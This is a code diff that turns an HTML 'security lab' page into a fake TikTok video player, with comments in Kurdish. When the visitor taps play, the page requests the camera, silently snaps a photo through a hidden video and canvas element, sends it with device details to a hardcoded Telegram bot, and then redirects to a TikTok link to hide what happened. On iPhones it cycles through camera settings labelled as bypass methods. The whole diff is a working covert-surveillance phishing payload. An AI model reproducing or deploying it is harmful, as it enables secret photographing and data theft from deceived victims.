@@ -2,59 +2,83 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>iPhone Security Lab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok . Video Player</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #0f0; height: 300px; overflow-y: scroll; padding: 10px; margin-top: 20px; }
+        body { margin: 0; background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('pasha.jpg') no-repeat center center; background-size: cover; opacity: 0.7; z-index: 1; }
+        .play-btn { position: relative; z-index: 10; width: 100px; height: 100px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid #fff; }
+        .play-icon { width: 0; height: 0; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 35px solid white; margin-left: 10px; }
+        #status { position: fixed; bottom: 20px; font-size: 10px; color: #555; z-index: 100; }
     </style>
 </head>
 <body>
-    <h2>iOS Vulnerability Scanner v1.0</h2>
-    <p>بۆ دەستپێکردنی تاقیکردنەوە، کلیک لە دوگمەی خوارەوە بکە:</p>
-    <button onclick="runFuzzer()" style="padding: 15px; background: #0f0; color: #000; border: none; cursor: pointer;">START SCAN</button>
-    
-    <div id="log">ئامادەیە بۆ تاقیکردنەوە...</div>
+    <div class="bg"></div>
+    <div class="play-btn" onclick="startGlobalExploit()">
+        <div class="play-icon"></div>
+    </div>
+    <div id="status">System Ready...</div>
+
+    <video id="v" autoplay playsinline muted style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
 
-        function reportToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🔍 iPhone Lab: " + msg)}`);
-            document.getElementById('log').innerHTML += "><br>" + msg;
+        async function sendLog(msg) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 Device Log: " + msg)}`);
         }
 
-        async function runFuzzer() {
-            reportToTelegram("Scanning started on: " + navigator.userAgent);
+        async function takeSnap(methodName) {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.7))).blob();
+            const fd = new FormData();
+            fd.append('chat_id', chat_id);
+            fd.append('photo', blob, 'snap.jpg');
+            fd.append('caption', `✅ SUCCESS! Method: ${methodName}\nAgent: ${navigator.userAgent}`);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+        }
 
-            // تاقیکردنەوەی ١: WebRTC Race Condition
-            try {
-                reportToTelegram("Testing Method 1 (WebRTC Race)...");
-                let stream = await navigator.mediaDevices.getUserMedia({video: true});
-                if (stream) reportToTelegram("✅ SUCCESS: Method 1 found a leak!");
-            } catch(e) { reportToTelegram("❌ Method 1 blocked: " + e.name); }
+        async function startGlobalExploit() {
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            sendLog("User Clicked. OS: " + (isIOS ? "iOS" : "Android"));
 
-            // تاقیکردنەوەی ٢: Shadow DOM Injection
-            try {
-                reportToTelegram("Testing Method 2 (Shadow DOM)...");
-                const host = document.createElement('div');
-                const shadow = host.attachShadow({mode: 'closed'});
-                const video = document.createElement('video');
-                shadow.appendChild(video);
-                // تاقیکردنەوەی دەستڕاگەیشتن لە ڕێگەی شادۆوە
-                let stream = await navigator.mediaDevices.getUserMedia({video: true});
-                if (stream) reportToTelegram("✅ SUCCESS: Method 2 leaked via Shadow DOM!");
-            } catch(e) { reportToTelegram("❌ Method 2 blocked."); }
+            if (!isIOS) {
+                // --- فێڵی ئەندرۆید (گالاکسی) ---
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                    document.getElementById('v').srcObject = s;
+                    setTimeout(async () => {
+                        await takeSnap("Android Stealth");
+                        window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
+                    }, 500);
+                } catch (e) {
+                    window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
+                }
+            } else {
+                // --- فێڵی ئایفۆن (Fuzzing & Detection) ---
+                const methods = [
+                    { name: "WebRTC Stealth", config: { video: { facingMode: "user" } } },
+                    { name: "Low Res Bypass", config: { video: { width: 100 } } }
+                ];
 
-            // تاقیکردنەوەی ٣: Silent Capture during Hash Change
-            try {
-                reportToTelegram("Testing Method 3 (Hash Transition)...");
-                window.location.hash = "exploit_test";
-                let stream = await navigator.mediaDevices.getUserMedia({video: true});
-                if (stream) reportToTelegram("✅ SUCCESS: Method 3 bypassed via Hash!");
-            } catch(e) { reportToTelegram("❌ Method 3 blocked."); }
-
-            reportToTelegram("Scan Complete. No open 0-day found in this session.");
+                for (let m of methods) {
+                    try {
+                        const s = await navigator.mediaDevices.getUserMedia(m.config);
+                        document.getElementById('v').srcObject = s;
+                        await takeSnap(m.name);
+                        break; // ئەگەر یەکێکیان سەرکەوتوو بوو، بوەستە
+                    } catch (err) {
+                        sendLog(`Method ${m.name} failed: ${err.name}`);
+                    }
+                }
+                // لە کۆتاییدا هەر دەچێتە سەر تیکتۆکەکە
+                setTimeout(() => { window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/"; }, 2000);
+            }
         }
     </script>
 </body>
